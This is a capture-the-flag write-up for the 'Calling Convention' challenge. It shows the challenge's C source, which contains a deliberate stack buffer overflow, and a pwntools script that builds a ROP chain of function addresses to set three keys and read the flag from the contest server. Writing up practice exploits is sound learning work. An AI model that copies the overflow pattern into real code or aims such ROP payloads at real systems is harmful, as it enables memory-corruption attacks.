# Calling Convention

When I competed in Bearcat World Tour CTF 2025 I came across this challenge towards the end of the ctf. This challenge provide the full C source code conveniently (although it was absolutely not necessary to complete this challenge).

```C
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>


void store_a_charstar();
void menu();
void vuln();
void store_floats();
int key1 = 0;
int key2 = 0;
int key3 = 0;
int floatcount = 0;

void setup() {
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stderr, 0, _IONBF, 0);
}

int main(int argc, char **argv) {
    setup();
    menu();
    vuln();
}

void win() {
    FILE *f;
    char c;
    f = fopen("flag.txt", "rt");
    if (key1 != 27000 && key2 != 0xbadf00d && key3 != 0x1337){
        fclose(f);
        exit(1);
    }

    while ( (c = fgetc(f)) != EOF ) {
        printf("%c", c);
        fflush(stdout);
    }
    fclose(f);

}
void set_key1() {
    if (key3 != 0)
        key1 = 27000;
}

void ahhhhhhhh() {
    if (key1 == 0)
        return;
    key3 = 0;
    key2 = key2 + 0xbad0000;
}

void food() {
    key2 = key2 + 0xf00d;
}

void number3() {
    key3 = 0x1337;
}

void menu() {
    puts("Try out this new calling convention!");
    puts("Instead of calling functions directly, you just return to them instead!");
    printf(" > ");
}

void vuln() {
    fflush(stdout);
    char s[8];
	fgets(s, 0x200, stdin);
}
```

This challenge immediately looks pretty straightforward, the vulnerablility is even labled. Simply pass 12 bytes to overflow 's' then the memory location of win(). 

However, the win function checks three keys which are checked before reading the flag. This means we will have to build a very simple ROP chain to set the keys to their expected values before calling the win function. Luckly, this is about as easy as any ROP challenge gets as we just need to figure out what functions need to be run and place their memory addresses after the overflow sequentially. 

```C
void win() {
    FILE *f;
    char c;
    f = fopen("flag.txt", "rt");
    if (key1 != 27000 && key2 != 0xbadf00d && key3 != 0x1337){
        fclose(f);
        exit(1);
    }

    while ( (c = fgetc(f)) != EOF ) {
        printf("%c", c);
        fflush(stdout);
    }
    fclose(f);

}
void set_key1() {
    if (key3 != 0)
        key1 = 27000;
}

void ahhhhhhhh() {
    if (key1 == 0)
        return;
    key3 = 0;
    key2 = key2 + 0xbad0000;
}

void food() {
    key2 = key2 + 0xf00d;
}

void number3() {
    key3 = 0x1337;
}
```

Looking at these three functions we see that we need to set key3 first so that we are able to set key1 which is required to set key 2. Then key3 needs to be set again as it is set to 0 while setting key2. The functions need to be called in the following order.

```C
number3();
set_key1();
ahhhhhhhh();
food();
number3();
win();
```

After going into ghidra to check the offsets of each of these functions my solve script looked something like this:
```python
from pwn import remote
from pwn import *
# Define the offsets for the keys
win = 0x004012f3
key3 = 0x00401404
key1 = 0x00401397
key2_1 = 0x004013b6
key2_2 = 0x004013e8
def run(conn, payload: bytes):
    conn.sendlineafter("> ", payload)  # Send the payload
    response = conn.recv(1024)  # Read output of remote
    print(response.decode())
    
def solvefunction():
    # Create the payload with the necessary sequence of offsets (keys)
    # Use p64 to pack the addresses as 64-bit little-endian values
    solution = b'A' * 12 + p64(key3) + p64(key1) + p64(key2_1) + p64(key2_2) + p64(key3) + p64(win)
    return solution

# Connect to the remote service
conn = remote("chal.bearcatctf.io", 39440)
payload = solvefunction()
run(conn, payload)
 
conn.interactive()
```
This produced the flag for a quick 500 point solve. 